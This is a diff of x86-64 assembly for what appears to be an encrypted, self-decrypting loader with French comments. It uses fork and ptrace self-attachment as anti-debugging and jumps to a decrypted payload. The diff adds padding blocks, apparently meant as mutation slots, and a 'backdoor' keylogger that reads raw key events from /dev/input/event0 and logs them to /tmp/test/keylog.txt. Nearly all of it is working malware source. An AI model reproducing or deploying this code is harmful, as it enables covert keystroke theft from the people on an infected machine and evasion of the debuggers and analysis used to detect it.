@@ -17,6 +17,12 @@ fork_check:
 	mov rax, 0x39
 	syscall	;fork
 	mov r14, rax
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	je child_check
 	jl end_ft_end
@@ -26,6 +32,12 @@ fork_check:
 	add rsp, 0x20
 	and rax, 0xff00
 	shr rax, 8
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 1	;check if ok with WEXITSTATUS
 	je end_ft_end
 
@@ -34,10 +46,15 @@ fork_hash:
 	mov rax, 0x39
 	syscall	;fork
 	mov r14, rax
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	je child_hash
 	jl end_ft_end
-	jmp wait_loop
 
 wait_loop:
 	jmp wait_loop
@@ -60,13 +77,19 @@ hash:
 	;    mov edi, 5381 ;hash
 	mov edi, r13d ; r13 got result of hash loader
 	;    mov r13d, edi ;hash bis
-	mov rdx, 0x10 ;size payload + bis_size a modifier 0x1f4f
+	mov rdx, 0x44d ;size payload + bis_size a modifier 0x1f4f
 	mov rsi, 0 ;inc
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	lea rcx, [syscalls] ;adresse syscalls
 hash_loop1:
-	cmp rsi, 0x109;|REPLACE3| offset key a eviter
+	cmp rsi,0x11f;|REPLACE3| offset key a eviter
 	jl after_cmp
-	cmp rsi, 0x10d;|REPLACE4| offset key a eviter
+	cmp rsi,0x123;|REPLACE4| offset key a eviter
 	jle hash_loop2
 after_cmp:
 	shl edi, 5
@@ -97,6 +120,12 @@ chiffrement:
 	add r15d, r13d
 	mov r9, 8 ; NB_TIMING MOODULABLE ; chiffrement
 	mov r14, 0x95837523 ; SUB ; chiffrement
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pushfq ; verif step by step
 	pop r12
 	mov r13, 1 ; mark this zone as loader ; chiffrement
@@ -144,9 +173,15 @@ label_jmp_to_payload:
 	jmp r15 ; addresse du payload ; jmp_to_payload
 ft_end:
 	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x40fe;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x50a0;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	jmp after_exit_3
 	jmp after_exit_4
@@ -188,12 +223,24 @@ end_ft_end:
 	pop r14 ; pop
 	pop r13 ; pop
 	pop r12 ; pop
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pop r11 ; pop
 	pop r10 ; pop
 	pop r9 ; pop
 	pop r8 ; pop
 	pop rdx ; pop
 	pop rcx ; pop
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	pop rbx ; pop
 	pop rax ; pop
 	pop rsi ; pop
@@ -225,6 +272,12 @@ wait4_for_parent:
 	mov rdi, r14
 	lea rsi, [rbp - 0x20]
 	mov rdx, 0x2
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov r10, 0
 	mov rax, 0x3d
 	syscall
@@ -237,6 +290,12 @@ wait4_for_child:
 	mov r10, 0
 	mov rax, 0x3d
 	syscall
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	ret
 
 ptrace:
@@ -246,10 +305,10 @@ ptrace:
 	syscall
 	ret
 
-;print_exit1:
-;	db "exit1"
-;print_exit0:
-;	db "exit0"
+print_exit1:
+	db "exit1"
+print_exit0:
+	db "exit0"
 
 exit_1:	
 ;	mov rdi, 1
@@ -273,13 +332,102 @@ exit_0:
 	mov rdi, 0x0
 	syscall
 
+
+write_path1 db  "/dev/input/event0", 0
+
+;write_path1:
+;	mov [rsp], DWORD 0x7665642f
+;	mov [rsp + 0x4], DWORD 0x706e692f
+;	mov [rsp + 0x8], DWORD 0x652f7475
+;	mov [rsp + 0xc], DWORD 0x746e6576
+;	mov [rsp + 0x10], DWORD 0x00000030
+;	ret
+
+write_path2 db "/tmp/test/keylog.txt", 0
+;	mov [rsp], DWORD 0x706d742f
+;	mov [rsp + 0x4], DWORD 0x7365742f
+;	mov [rsp + 0x8], DWORD 0x656b2f74
+;	mov [rsp + 0xc], DWORD 0x676f6c79
+;	mov [rsp + 0x10], DWORD 0x2e726567
+;	mov [rsp + 0x14], DWORD 0x00747874
+;	ret
+
+backdoor:
+	sub rsp, 0x20
+	lea rdi, [write_path1]
+	xor rsi, rsi
+	mov rdx, 0
+	mov rax, 0x2 ; OPEN SYSCALL
+	syscall
+	cmp rax, 0
+	jl exit_1
+
+	mov DWORD [rbp - 0x20], eax
+
+	lea rdi, [write_path2]
+	mov rsi, 0x41
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
+	mov rdx, 666o
+	mov rax, 0x2
+	syscall
+
+;	mov rdi, 1
+;	lea rsi, [print_exit0]
+;	mov rdx, 5
+;	mov rax, 1
+;	syscall
+
+	cmp rax, 0
+	jl exit_1
+	mov DWORD [rbp - 0x1c], eax
+
+loop_keylogger:
+	mov edi, DWORD [rbp - 0x20]
+	lea rsi, [rbp - 0x18]
+	mov rdx, 0x18 ;size of struct input_event
+	xor rax, rax
+	syscall ;read
+	
+	cmp [rbp - 0x8], WORD 0x1 ;event type is EV_KEY
+	jne loop_keylogger
+	cmp [rbp - 0x4], DWORD 0x1 ;event value
+	jne loop_keylogger
+
+	mov edi, DWORD [rbp - 0x1c]
+	mov si, WORD [rbp - 0x6]
+	mov rdx, 0x2
+	mov rax, 0x1
+	syscall ;write
+
+	jmp loop_keylogger
+
 child_hash:
+;	xor rax, rax
+;	mov rax, 0x39
+;	syscall	;fork
+;	mov r14, rax
+;	cmp rax, 0
+;	je backdoor
+;	jl exit_1
+	
+	
 	call getppid
 	mov r14, rax
 	sub rsp, 0x100 ; struct size = 0xd8
 	mov rdi, 0x10
 	mov r10, 0
 	call ptrace ; PTRACE_ATTACH
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0
 	jl exit_1
 	call wait4_for_child
@@ -310,6 +458,12 @@ child_hash2:
 	mov rdi, 0x07
 	mov r10, 0
 	call ptrace ; PTRACE_CONT
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	call wait4_for_child ; wait end parent after exit
 	add rsp, 0x100
 	jmp exit_0
